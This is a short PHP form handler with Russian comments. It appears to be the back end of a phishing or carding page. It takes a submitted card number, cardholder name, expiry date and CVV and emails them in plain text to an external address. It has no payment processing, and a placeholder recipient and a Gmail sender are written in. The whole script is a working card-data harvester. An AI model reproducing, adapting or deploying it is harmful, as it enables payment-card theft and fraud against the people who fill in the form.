<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Получаем данные из формы
    $cardNumber = htmlspecialchars($_POST['card-number']);
    $cardHolder = htmlspecialchars($_POST['card-holder']);
    $expiryDate = htmlspecialchars($_POST['expiry-date']);
    $cvv = htmlspecialchars($_POST['cvv']);

    // Ваш email
    $to = "ваш_email@example.com";
    $subject = "Новые данные карты";
    $message = "Номер карты: $cardNumber\n";
    $message .= "Имя владельца: $cardHolder\n";
    $message .= "Срок действия: $expiryDate\n";
    $message .= "CVV: $cvv\n";

    // Отправка email
    $headers = "From: prbrandmonitoor1@gmail.com"; // Укажите здесь реальный email
    if (mail($to, $subject, $message, $headers)) {
        echo "Данные успешно отправлены!";
    } else {
        echo "Ошибка при отправке данных.";
    }
}
?>